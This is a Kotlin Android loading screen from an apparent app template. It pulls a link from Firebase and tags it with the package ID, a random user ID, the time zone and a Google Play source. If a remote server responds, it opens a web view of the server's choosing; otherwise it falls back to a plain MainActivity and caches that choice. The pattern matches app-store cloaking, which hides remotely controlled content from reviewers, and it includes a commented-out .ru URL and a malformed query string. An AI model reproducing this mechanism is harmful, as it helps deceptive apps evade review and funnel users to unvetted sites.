package com.template

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.webkit.WebSettings
import android.webkit.WebView
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.FirebaseApp
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.IOException
import java.util.TimeZone
import java.util.UUID


class LoadingActivity : AppCompatActivity() {
    val KEY_LINK = "link"
    val LINK_IS_EMPTY = "empty"
    val LINK_IS_ERROR = "error"
    lateinit var mFirebaseAnalytics: FirebaseAnalytics
    lateinit var mSharedPreferences: SharedPreferences
    lateinit var mEditor: SharedPreferences.Editor

    @SuppressLint("CommitPrefEdits")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        if(checkedSavedLink()){
            startMainActivity()
        } else {

            val linkRef = initializationSDK()

            if (isInternetAvailable()) {
                listenerDB(linkRef)
            } else {
                startMainActivity()
            }
        }

    }

    private fun initializationSDK(): DatabaseReference {
        mEditor = mSharedPreferences.edit()
        FirebaseApp.initializeApp(this)
        mFirebaseAnalytics = FirebaseAnalytics.getInstance(this);
        FirebaseApp.initializeApp(this)
        val database = FirebaseDatabase.getInstance()
        val myRef = database.getReference("db")
        return myRef.child("link")
    }

    private fun checkedSavedLink(): Boolean{
        mSharedPreferences = getSharedPreferences("my_prefs", MODE_PRIVATE)
        val savedLink = mSharedPreferences.getString(KEY_LINK, "")
        return savedLink == LINK_IS_ERROR || savedLink == LINK_IS_EMPTY
    }

    private fun isInternetAvailable(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)

            capabilities?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
        } else {
            val networkInfo = connectivityManager.activeNetworkInfo
            networkInfo != null && networkInfo.isConnected
        }
    }

    private fun listenerDB(linkRef: DatabaseReference) {
        linkRef.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists()) {
                    val linkValue = snapshot.getValue(String::class.java)
                    if(linkValue != null){
                        val completeUrl = makeURl(linkValue)
                        getUrlWebViewFromUrl(completeUrl)
                    } else {
                        mEditor.putString(KEY_LINK, LINK_IS_EMPTY)
                        mEditor.apply()
                        startMainActivity()
                    }

                } else {
                    startMainActivity()
                }
            }
            override fun onCancelled(error: DatabaseError) {
                startMainActivity()
            }
        })
    }

    fun getUserAgent(context: Context): String {
        val webView = WebView(context)
        val settings: WebSettings = webView.settings
        return settings.userAgentString
    }

    private fun startMainActivity() {
        startActivity(Intent(this, MainActivity::class.java))
    }
    private fun makeURl(link: String): String {
        val packageName = applicationContext.packageName
        val uuid = UUID.randomUUID()
        val currentTimeZone = TimeZone.getDefault()
        return link + "/?packageid=" + packageName + "&usserid=" + uuid + "getz=" + currentTimeZone + "getr=utm_source=google-play&utm_medium=organic"
    }

    @OptIn(DelicateCoroutinesApi::class)
    private fun getUrlWebViewFromUrl(completeUrl: String){
        val client = OkHttpClient()

        val userAgent = getUserAgent(this)
//        val completeUrl2 = "https://http://ksdhfksdhjf.ru/"
        val request = Request.Builder()
            .url(completeUrl)
            .header("User-Agent", userAgent)
            .build()
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val response = client.newCall(request).execute()

                if (response.isSuccessful) {
                    val responseBody = response.body?.string()
                    if (responseBody != null) {
                        startWebView(responseBody)
                    }
                } else {
                    startMainActivity()
                }
            } catch (e: IOException) {
                mEditor.putString(KEY_LINK, LINK_IS_ERROR)
                mEditor.apply()
                startMainActivity()
            }
        }
    }
    private fun startWebView(url: String){
        val intent = Intent(this, WebActivity::class.java)
        intent.putExtra("url", url)
        startActivity(intent)
    }
}